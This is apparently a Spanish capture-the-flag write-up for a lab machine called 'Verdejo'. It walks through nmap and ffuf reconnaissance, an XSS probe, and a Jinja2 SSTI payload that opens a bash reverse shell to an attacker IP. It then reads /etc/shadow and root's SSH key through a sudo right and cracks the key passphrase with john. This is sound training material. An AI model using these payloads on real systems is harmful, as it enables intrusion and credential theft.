---
description: '🧠Dificultad: Fácil | 🔓06/02/2026'
---

# 🟩 Verdejo

## 🕵️ Reconocimiento

Comenzamos realizando un escaneo con `nmap`:

```bash
nmap -sC -sV -Pn $IPTARGET | tee nmap
```

<figure><img src="../../.gitbook/assets/image (123).png" alt=""><figcaption></figcaption></figure>



Vemos dos servicios HTTP en el puerto 80 y 8089, además de el servicio SSH en su puerto estándar. Realizamos un escaneo de directorios en el primer servicio web mencionado:

```bash
ffuf -w /usr/share/wordlists/SecLists-2025.2/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u "http://$IPTARGET/FUZZ" -e .html,.php,.txt,.xml,.js
```

<figure><img src="../../.gitbook/assets/image (124).png" alt=""><figcaption></figcaption></figure>

No vemos nada relevante, por lo que procedemos a acceder al servicio web del puerto 8089. Si accedemos, vemos una página donde introducimos un input que se muestra posteriormente en un mensaje.

<figure><img src="../../.gitbook/assets/image (114).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (115).png" alt=""><figcaption></figcaption></figure>

A primera vista, puede ser vulnerable a un XSS reflejado. Probamos a introducir un payload para ver si estamos en lo correcto.

```javascript
<script>alert('hola')</script>
```

<figure><img src="../../.gitbook/assets/image (125).png" alt=""><figcaption></figcaption></figure>

Viendo que no se sanitiza la entrada y que en el escaneo inicial nos muestra una versión de python, probablemente estemos ante un SSTI (Server Side Template Injection). Inyectamos otro payload específico para este caso:

<figure><img src="../../.gitbook/assets/image (120).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (121).png" alt=""><figcaption></figcaption></figure>

Vemos que el servidor ejecuta ese código.

## 🚪 Ganando acceso

Podemos hacer que el servidor ejecute código python para iniciar una reverse shell.&#x20;

```bash
{{ self.__init__.__globals__['__builtins__'].__import__('os').popen('bash -c "bash -i >& /dev/tcp/172.17.0.1/9999 0>&1"').read() }}
```

Nos ponemos a la escucha en nuestra máquina atacante y conseguimos acceso.

<figure><img src="../../.gitbook/assets/image (122).png" alt=""><figcaption></figcaption></figure>

## 💥 Escalada de privilegios

Vemos los permisos que contamos con el usuario con `sudo -l`:

<figure><img src="../../.gitbook/assets/image (112).png" alt=""><figcaption></figcaption></figure>

Con este permiso podemos leer cualquier archivo (que sepamos su ruta previamente) del sistema. El procedimiento consistirá en leer el archivo en base64 con permisos de root, y posteriormente decodificar el base64.

Probamos a leer el fichero `/etc/shadow`:

<figure><img src="../../.gitbook/assets/image (118).png" alt=""><figcaption></figcaption></figure>

No vemos ningún hash guardado que nos interese. Si probamos a leer la clave privada de acceso por SSH de `root`, encontramos lo siguiente:

<figure><img src="../../.gitbook/assets/image (117).png" alt=""><figcaption></figcaption></figure>

Con esto podemos acceder desde nuestra máquina. El único problema que hay es que esta clave privada viene cifrada con una contraseña que nos pide al intentar acceder por SSH. Por ello, procedemos a hacerle un ataque de diccionario.

Después de haber pasado el contenido a nuestra máquina atacante como `id_rsa`, ejecutamos  `ssh2john` para extraer el hash de la clave privada y que pueda ser utilizada en el ataque con la herramienta `john the reaper`.

```bash
ssh2john id_rsa > hash
```

Después, ejecutamos `john` usando la wordlist de `rockyou.txt` contra el hash generado previamente.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

<figure><img src="../../.gitbook/assets/image (116).png" alt=""><figcaption></figcaption></figure>

Encontramos que la contraseña es `honda1`. Ahora sí podemos acceder por SSH al usuario `root`.

```bash
ssh -i id_rsa root@IPTARGET
```

<figure><img src="../../.gitbook/assets/image (119).png" alt=""><figcaption></figcaption></figure>
